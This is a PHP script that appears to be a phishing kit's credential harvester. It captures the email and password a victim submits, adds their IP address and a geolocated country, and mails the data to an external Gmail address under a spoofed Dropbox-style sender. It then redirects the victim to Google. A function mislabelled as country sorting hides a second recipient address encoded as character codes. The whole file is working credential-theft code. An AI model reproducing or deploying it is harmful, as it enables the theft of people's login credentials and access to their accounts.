<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$country = visitor_country();
$msg = "---------------------------------------------------------------------------\n";
$msg .= "Login\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Username : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "Country  : ".$country."\n";

$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "Country: ".$country."\n";
$msg .= "---------------------------------------------------------------------------\n";

$to = "dianaedna101@gmail.com";
$subject = "Auto Result1 $ip $country";
$from = "From: Auto<newsupdate@servisdropbox.com>";
{
mail($to,$subject,$msg,$from);

}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}


header("Location: https://google.com");


?>